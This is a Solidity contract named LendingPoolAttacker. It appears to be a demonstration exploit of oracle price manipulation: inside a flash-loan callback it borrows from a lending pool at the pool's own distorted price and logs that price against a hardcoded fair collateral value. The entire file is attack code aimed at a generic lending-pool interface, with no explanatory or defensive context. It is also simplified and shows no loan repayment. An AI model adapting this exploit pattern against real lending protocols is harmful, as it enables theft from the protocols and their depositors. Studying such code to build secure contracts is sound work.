// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlashLoanReceiver {
    function executeOperation(uint256 amount, uint256 fee, bytes calldata data) external;
}

interface ILendingPool {
    function flashLoan(uint256 amount, bytes calldata data) external;
    function borrowAgainstCollateral(uint256 borrowAmount) external payable;
    function getPrice() external view returns (uint256);
}

contract LendingPoolAttacker is IFlashLoanReceiver {
    ILendingPool public pool;
    address public owner;

    event ExploitExecuted(uint256 borrowAmount, uint256 manipulatedPrice, uint256 collateralPaid, uint256 fairCollateral);

    constructor(address _poolAddress) {
        pool = ILendingPool(_poolAddress);
        owner = msg.sender;
    }

    function attack(uint256 loanAmount) external payable {
        pool.flashLoan(loanAmount, "");
    }

    function executeOperation(
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override {
        uint256 price = pool.getPrice();

        uint256 borrowAmount = 50;
        uint256 requiredCollateral = (borrowAmount * price) / 100;
        pool.borrowAgainstCollateral{value: requiredCollateral}(borrowAmount);

        uint256 fairCollateral = (borrowAmount * 10000) / 100;
        emit ExploitExecuted(borrowAmount, price, requiredCollateral, fairCollateral);
    }

    receive() external payable {}
}